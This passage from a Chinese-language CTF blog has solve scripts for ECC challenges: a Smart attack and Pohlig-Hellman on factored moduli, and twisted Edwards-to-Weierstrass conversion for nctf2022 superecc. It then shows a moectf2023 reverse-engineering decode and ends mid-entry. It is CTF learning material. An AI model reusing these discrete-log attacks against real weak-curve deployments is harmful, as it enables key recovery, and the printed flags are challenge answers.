class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(flag[:<span class="number">5</span>] == <span class="string">b&quot;flag&#123;&quot;</span> <span class="keyword">and</span> flag[-<span class="number">1</span>:] == <span class="string">b&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = flag[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">d1 = bytes_to_long(flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>])</span><br><span class="line">d2 = bytes_to_long(flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">N1 = <span class="number">27544759469094453505371358768052861416297003882211878831861112512567899543941</span></span><br><span class="line">A1 = <span class="number">4208715803791813173086894172778966025419787767340027559010619240548499823390</span></span><br><span class="line">B1 = <span class="number">11846440123913040489420209031751160809904311707943252241515965930654415480691</span></span><br><span class="line">P1x = <span class="number">479750084250968709343887919962436485997147832319843477221083468203689368148</span></span><br><span class="line">P1y = <span class="number">15452861783577624143044213767588871736433639621547613407582902947429567101675</span></span><br><span class="line"></span><br><span class="line">P1 = (P1x,P1y)</span><br><span class="line">E1 = EllipticCurve(Zmod(N1), [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, A1, B1])</span><br><span class="line">P1 = E1(P1)</span><br><span class="line">Q1 = d1 * P1</span><br><span class="line"></span><br><span class="line">N2 = <span class="number">6471339743593595797696002766822660599108196938080465998531085409467</span></span><br><span class="line">A2 = <span class="number">3199218821393204771660095172457569312269694438403110131957204042314</span></span><br><span class="line">B2 = <span class="number">762889472027318213897694878260359911054972690369935049954326689904</span></span><br><span class="line">P2x = <span class="number">2557373437970770011124755960432555084678930336188254243278984381842</span></span><br><span class="line">P2y = <span class="number">4442763096366920105760404533052204677305995021662082361185473321644</span></span><br><span class="line"></span><br><span class="line">P2 = (P2x,P2y)</span><br><span class="line">E2 = EllipticCurve(Zmod(N2), [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, A2, B2])</span><br><span class="line">P2 = E2(P2)</span><br><span class="line">Q2 = d2 * P2</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Q1)</span><br><span class="line"><span class="built_in">print</span>(Q2)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">(14736970297054248276364510675718632926198693034158620007675880103924809577805 : 3447209262654420855289144268810543114387612255490962015335062266658385100211 : 1)</span></span><br><span class="line"><span class="string">(4834036103940457959470026215023033401071737087504569417466448644066 : 5511016821581393405975510064568222454318072088628361854656950557373 : 1)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先贴份exp 有些地方还没弄清楚<br>大致意思是 这里的N都不大 我们可以分解出来 转换成 p,q的求解<br>然后对应 p比较光滑 和 p&#x3D;&#x3D;E.order()的情况 分别用Pohlig-Hellman 和 SmartAttack<br>有个要注意的点是 P1,Q1不是生成元 所以最后CRT组合的时候要用点的阶而不是曲线的阶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SmartAttack</span>(<span class="params">P,Q,p</span>):</span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(Qp(p, <span class="number">2</span>), [ ZZ(t) + randint(<span class="number">0</span>,p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants() ])</span><br><span class="line"></span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> P_Qp <span class="keyword">in</span> P_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(P_Qp.xy()[<span class="number">1</span>]) == P.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> Q_Qp <span class="keyword">in</span> Q_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(Q_Qp.xy()[<span class="number">1</span>]) == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p_times_P = p*P_Qp</span><br><span class="line">    p_times_Q = p*Q_Qp</span><br><span class="line"></span><br><span class="line">    x_P,y_P = p_times_P.xy()</span><br><span class="line">    x_Q,y_Q = p_times_Q.xy()</span><br><span class="line"></span><br><span class="line">    phi_P = -(x_P/y_P)</span><br><span class="line">    phi_Q = -(x_Q/y_Q)</span><br><span class="line">    k = phi_Q/phi_P</span><br><span class="line">    <span class="keyword">return</span> ZZ(k)</span><br><span class="line"></span><br><span class="line">N1 = </span><br><span class="line">A1 = </span><br><span class="line">B1 = </span><br><span class="line">P1x = </span><br><span class="line">P1y = </span><br><span class="line"></span><br><span class="line">Q1x = </span><br><span class="line">Q1y = </span><br><span class="line"></span><br><span class="line">p1 = </span><br><span class="line">q1 = </span><br><span class="line"></span><br><span class="line">P1 = (P1x, P1y)</span><br><span class="line">Q1 = (Q1x, Q1y)</span><br><span class="line">E1p = EllipticCurve(Zmod(p1), [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, A1, B1])</span><br><span class="line">n1p = E1p.order()</span><br><span class="line">P1p = E1p(P1)</span><br><span class="line">Q1p = E1p(Q1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(n1p)</span></span><br><span class="line"><span class="comment"># Pohlig Hellman</span></span><br><span class="line">d1p = P1p.discrete_log(Q1p)</span><br><span class="line"></span><br><span class="line">E1q = EllipticCurve(Zmod(q1), [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, A1, B1])</span><br><span class="line">n1q = E1q.order()</span><br><span class="line">P1q = E1q(P1)</span><br><span class="line">Q1q = E1q(Q1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(n1q)</span></span><br><span class="line"><span class="comment"># Smart</span></span><br><span class="line">d1q = SmartAttack(P1q, Q1q, q1)</span><br><span class="line"></span><br><span class="line">d1 = crt([d1p, d1q], [P1p.order(), P1q.order()])</span><br><span class="line"><span class="built_in">print</span>(d1)</span><br><span class="line"></span><br><span class="line">N2 = </span><br><span class="line">A2 = </span><br><span class="line">B2 = </span><br><span class="line">P2x = </span><br><span class="line">P2y = </span><br><span class="line">Q2x = </span><br><span class="line">Q2y = </span><br><span class="line"></span><br><span class="line">p2 = <span class="number">69857405335111415530599248077</span></span><br><span class="line">q2 = <span class="number">92636417177965240871815246762704348071</span></span><br><span class="line"></span><br><span class="line">P2 = (P2x,P2y)</span><br><span class="line">Q2 = (Q2x,Q2y)</span><br><span class="line">E2p = EllipticCurve(Zmod(p2), [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, A2, B2])</span><br><span class="line">n2p = E2p.order()</span><br><span class="line">P2p = E2p(P2)</span><br><span class="line">Q2p = E2p(Q2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(n2p)</span></span><br><span class="line"><span class="comment"># Pohlig Hellman</span></span><br><span class="line"><span class="comment"># d2p = P2p.discrete_log(Q2p)</span></span><br><span class="line"><span class="comment"># 64863796476861801236088764479</span></span><br><span class="line">d2p = <span class="number">64863796476861801236088764479</span></span><br><span class="line"></span><br><span class="line">E2q = EllipticCurve(Zmod(q2), [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, A2, B2])</span><br><span class="line">n2q = E2q.order()</span><br><span class="line">P2q = E2q(P2)</span><br><span class="line">Q2q = E2q(Q2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(n2q)</span></span><br><span class="line"><span class="comment"># Pohlig Hellman</span></span><br><span class="line">d2q = P2q.discrete_log(Q2q)</span><br><span class="line"></span><br><span class="line">d2 = crt([d2p, d2q], [P2p.order(), P2q.order()])</span><br><span class="line"><span class="built_in">print</span>(d2)</span><br></pre></td></tr></table></figure><h2 id="nctf2022-superecc"><a href="#nctf2022-superecc" class="headerlink" title="nctf2022 superecc"></a>nctf2022 superecc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> INF, flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;nctf&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">super_ecc</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = <span class="number">73101304688827564515346974949973801514688319206271902046500036921488731301311</span></span><br><span class="line">        self.c = <span class="number">78293161515104296317366169782119919020288033620228629011270781387408756505563</span></span><br><span class="line">        self.d = <span class="number">37207943854782934242920295594440274620695938273948375125575487686242348905415</span></span><br><span class="line">        self.p = <span class="number">101194790049284589034264952247851014979689350430642214419992564316981817280629</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, P, Q</span>):</span><br><span class="line">        (x1, y1) = P</span><br><span class="line">        (x2, y2) = Q</span><br><span class="line">        x3 = (x1 * y2 + y1 * x2) * inverse(self.c * (<span class="number">1</span> + self.d * x1 * x2 * y1 * y2), self.p) % self.p</span><br><span class="line">        y3 = (y1 * y2 - self.a * x1 * x2) * inverse(self.c * (<span class="number">1</span> - self.d * x1 * x2 * y1 * y2), self.p) % self.p</span><br><span class="line">        <span class="keyword">return</span> (x3, y3)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">self, x, P</span>):</span><br><span class="line">        Q = INF</span><br><span class="line">        x = x % self.p</span><br><span class="line">        <span class="keyword">while</span> x &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">                Q = self.add(Q, P)</span><br><span class="line">            P = self.add(P, P)</span><br><span class="line">            x = x &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(flag[<span class="number">5</span>:-<span class="number">1</span>])</span><br><span class="line">ecc = super_ecc()</span><br><span class="line">G = (<span class="number">30539694658216287049186009602647603628954716157157860526895528661673536165645</span>,</span><br><span class="line">     <span class="number">64972626416868540980868991814580825204126662282378873382506584276702563849986</span>)</span><br><span class="line">S = ecc.mul(flag, G)</span><br><span class="line"><span class="built_in">print</span>(S)</span><br><span class="line"><span class="comment"># (98194560294138607903211673286210561363390596541458961277934545796708736630623,</span></span><br><span class="line"><span class="comment"># 58504021112693314176230785309962217759011765879155504422231569879170659690008)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>涨知识了 orz<br>题目给的曲线形式是一条扭曲爱德华曲线 <a href="https://www.zhihu.com/question/290541183">https://www.zhihu.com/question/290541183</a><br>本题的形式为 <code>a*x^2+y^2=c^2(1+d*x^2*y^2)</code><br>其实椭圆曲线除了weierstrass形式常见的还有另外两种: 蒙哥马利曲线和扭曲爱德华曲线<br>所以这道题我们按照文章的方法将扭曲爱德华曲线-&gt;蒙哥马利曲线-&gt;维尔斯特拉斯曲线<br>注意要先将曲线变为 <code>a*v^2+w^2=1+d*v^2*w^2</code> 的形式</p><p><img src="https://s2.loli.net/2023/12/09/E9PyomncQWxMLre.png" alt="img"></p><p><img src="https://s2.loli.net/2023/12/09/sr59aSMuKceTk2b.png" alt="img"></p><p>直接搬官方题解的了 (其实就是照着公式打就行了)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">p = <span class="number">101194790049284589034264952247851014979689350430642214419992564316981817280629</span></span><br><span class="line">a = <span class="number">73101304688827564515346974949973801514688319206271902046500036921488731301311</span></span><br><span class="line">c = <span class="number">78293161515104296317366169782119919020288033620228629011270781387408756505563</span></span><br><span class="line">d = <span class="number">37207943854782934242920295594440274620695938273948375125575487686242348905415</span></span><br><span class="line">P.&lt;z&gt; = PolynomialRing(Zmod(p))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 形式&#x27;标准&#x27;化</span></span><br><span class="line">aa = a</span><br><span class="line">dd = (d*c^<span class="number">4</span>)%p</span><br><span class="line">J = (<span class="number">2</span>*(aa+dd)*inverse_mod(aa-dd,p))%p</span><br><span class="line">K = (<span class="number">4</span>*inverse_mod(aa-dd,p))%p</span><br><span class="line">A = ((<span class="number">3</span>-J^<span class="number">2</span>)*inverse_mod(<span class="number">3</span>*K^<span class="number">2</span>,p))%p</span><br><span class="line">B = ((<span class="number">2</span>*J^<span class="number">3</span>-<span class="number">9</span>*J)*inverse_mod(<span class="number">27</span>*K^<span class="number">3</span>,p))%p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这部分是为了 weier-&gt;twist</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>  P(z^<span class="number">3</span>+A*z+B).roots():</span><br><span class="line">    alpha = <span class="built_in">int</span>(i[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(kronecker(<span class="number">3</span>*alpha^<span class="number">2</span>+A,p))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> P(z^<span class="number">2</span>-(<span class="number">3</span>*alpha^<span class="number">2</span>+A)).roots():</span><br><span class="line">        s = <span class="built_in">int</span>(j[<span class="number">0</span>])</span><br><span class="line">        s = inverse_mod(s, p)</span><br><span class="line">        <span class="keyword">if</span> J==alpha*<span class="number">3</span>*s%p:</span><br><span class="line">            Alpha = alpha</span><br><span class="line">            S = s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">twist_to_weier</span>(<span class="params">x,y</span>): <span class="comment"># twist-&gt;mgml-&gt;weier</span></span><br><span class="line">    v = x*inverse_mod(c,p)%p</span><br><span class="line">    w = y*inverse_mod(c,p)%p</span><br><span class="line">    <span class="keyword">assert</span> (aa*v^<span class="number">2</span>+w^<span class="number">2</span>)%p==(<span class="number">1</span>+dd*v^<span class="number">2</span>*w^<span class="number">2</span>)%p</span><br><span class="line">    s = (<span class="number">1</span>+w)*inverse_mod(<span class="number">1</span>-w,p)%p <span class="comment"># s = (1+ω)/(1-ω)</span></span><br><span class="line">    t = s*inverse_mod(v,p)%p <span class="comment"># t = s/v</span></span><br><span class="line">    <span class="keyword">assert</span> (K*t^<span class="number">2</span>)%p==(s^<span class="number">3</span>+J*s^<span class="number">2</span>+s)%p</span><br><span class="line">    xW = (<span class="number">3</span>*s+J) * inverse_mod(<span class="number">3</span>*K, p) % p <span class="comment"># s = (3*K*x-J)/3</span></span><br><span class="line">    yW = t * inverse_mod(K, p) % p <span class="comment"># t = y/K</span></span><br><span class="line">    <span class="keyword">assert</span> yW^<span class="number">2</span> % p == (xW^<span class="number">3</span>+A*xW+B) % p</span><br><span class="line">    <span class="keyword">return</span> (xW,yW)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">weier_to_twist</span>(<span class="params">x,y</span>):</span><br><span class="line">    xM=S*(x-Alpha)%p</span><br><span class="line">    yM=S*y%p</span><br><span class="line">    <span class="keyword">assert</span> (K*yM^<span class="number">2</span>)%p==(xM^<span class="number">3</span>+J*xM^<span class="number">2</span>+xM)%p</span><br><span class="line">    xe = xM*inverse_mod(yM,p)%p</span><br><span class="line">    ye = (xM-<span class="number">1</span>)*inverse_mod(xM+<span class="number">1</span>,p)%p</span><br><span class="line">    <span class="keyword">assert</span> (aa*xe^<span class="number">2</span>+ye^<span class="number">2</span>)%p==(<span class="number">1</span>+dd*xe^<span class="number">2</span>*ye^<span class="number">2</span>)%p</span><br><span class="line">    xq = xe*c%p</span><br><span class="line">    yq = ye*c%p</span><br><span class="line">    <span class="keyword">assert</span> (a*xq^<span class="number">2</span>+yq^<span class="number">2</span>)%p==c^<span class="number">2</span>*(<span class="number">1</span>+d*xq^<span class="number">2</span>*yq^<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> (xq,yq)</span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(p), [A, B])</span><br><span class="line">G = twist_to_weier(<span class="number">30539694658216287049186009602647603628954716157157860526895528661673536165645</span>,<span class="number">64972626416868540980868991814580825204126662282378873382506584276702563849986</span>)</span><br><span class="line">Q = twist_to_weier(<span class="number">98194560294138607903211673286210561363390596541458961277934545796708736630623</span>,<span class="number">58504021112693314176230785309962217759011765879155504422231569879170659690008</span>)</span><br><span class="line">P = E(G)</span><br><span class="line">Q = E(Q)</span><br></pre></td></tr></table></figure><p>接下来就是在熟悉的维尔斯特拉斯曲线上求 flag*G &#x3D; Q 问题了<br>总共就那么几种方法(DLP,SmartAttack,CRT+PohligHellman)<br>发现P的阶能分解 所以直接Pohlig-Hellman 即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">factors, exponents = <span class="built_in">zip</span>(*factor(P.order()))</span><br><span class="line">primes = [factors[i] ^ exponents[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))][:-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(primes)</span><br><span class="line">dlogs = []</span><br><span class="line"><span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">    t = <span class="built_in">int</span>(<span class="built_in">int</span>(P.order()) // <span class="built_in">int</span>(fac))</span><br><span class="line">    dlog = discrete_log(t*Q,t*P,operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line">    dlogs += [dlog]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;factor: &quot;</span>+<span class="built_in">str</span>(fac)+<span class="string">&quot;, Discrete Log: &quot;</span>+<span class="built_in">str</span>(dlog)) <span class="comment">#calculates discrete logarithm for each prime order</span></span><br><span class="line">flag=crt(dlogs,primes)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># Tw1stzzzz</span></span><br></pre></td></tr></table></figure><hr><hr><p>大致列举了一些题目&#x2F;知识点<br>ECC很多进阶地方都需要较好的群论基础 等学的更扎实了再回来看 希望能有更深的体会</p>]]></content>
      
      
      <categories>
          
          <category> CTF-Crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Reverse-Other</title>
      <link href="/Reverse-Other/"/>
      <url>/Reverse-Other/</url>
      
        <content type="html"><![CDATA[<p>记录一些reverse题目</p><span id="more"></span><h1 id="moectf2023"><a href="#moectf2023" class="headerlink" title="moectf2023"></a>moectf2023</h1><h2 id="GUI"><a href="#GUI" class="headerlink" title="GUI"></a>GUI</h2><p>IDA打开跟进 很容易发现关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( Msg != <span class="number">273</span> )</span><br><span class="line">        <span class="keyword">return</span> DefWindowProcW(hWndParent, Msg, wParam, lParam);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int16)wParam == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        DlgItem = GetDlgItem(hWndParent, <span class="number">2</span>);</span><br><span class="line">        GetWindowTextW(DlgItem, String, <span class="number">1024</span>);</span><br><span class="line">        sub_150C94(String);</span><br><span class="line">        v13 = <span class="number">0</span>;</span><br><span class="line">        sub_150A0A(v7, v8);</span><br><span class="line">        LOBYTE(v13) = <span class="number">1</span>;</span><br><span class="line">        sub_150C94(a91);</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_1531AB(v7, v6) )</span><br><span class="line">          MessageBoxW(hWndParent, Text, <span class="string">L&quot;hint&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          MessageBoxW(hWndParent, <span class="string">L&quot;Sorry, flag error.&quot;</span>, <span class="string">L&quot;hint&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        sub_1529B8(v6);</span><br><span class="line">        LOBYTE(v13) = <span class="number">0</span>;</span><br><span class="line">        sub_1529B8(v7);</span><br><span class="line">        v13 = <span class="number">-1</span>;</span><br><span class="line">        sub_1529B8(v8);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>跟进 sub_150A0A(v7, v8); 会发现里面进行了 (-5)^0x51 操作<br>后面进行了strcmp的check<br>这里比较的另一个数组提取有点奇怪<br>动调会被反调试掉 setip跳到这里之前得到的值也不对<br>注意到check前面还有句: <code>sub_150C94(a91);</code><br>查看a91的值猜想可能是比较数组 因为这个 sub_150c94没有改变值<br>所以最后exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0x39</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x3E</span>, <span class="number">0x00</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x7C</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x1A</span>, <span class="number">0x00</span>, <span class="number">0x3C</span>, <span class="number">0x00</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x39</span>, <span class="number">0x00</span>, <span class="number">0x7F</span>, <span class="number">0x00</span>, <span class="number">0x3C</span>, <span class="number">0x00</span>, <span class="number">0x4D</span>, <span class="number">0x00</span>, <span class="number">0x4D</span>, <span class="number">0x00</span>, <span class="number">0x4D</span>, <span class="number">0x00</span>, <span class="number">0x29</span>]</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="keyword">if</span>(x!=<span class="number">0</span>):</span><br><span class="line">        c.append(x)</span><br><span class="line">enc = c</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((x^<span class="number">0x51</span>)+<span class="number">5</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># moectf&#123;GU1&amp;&amp;W1nd0w2_Pr1m3r!!!&#125;</span></span><br></pre></td></tr></table></figure><p>看WP说可以直接输入所以可能字符得到加密值来比较得到(因为是单字节加密) 但是我动调截不到对应值… 以后再来看吧</p><h2 id="unwind"><a href="#unwind" class="headerlink" title="unwind"></a>unwind</h2><p>main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+0h] [ebp-100h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_ECC063);</span><br><span class="line">  sub_EC13E3();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to moectf2023!!! Now you find YunZh1Jun&#x27;s 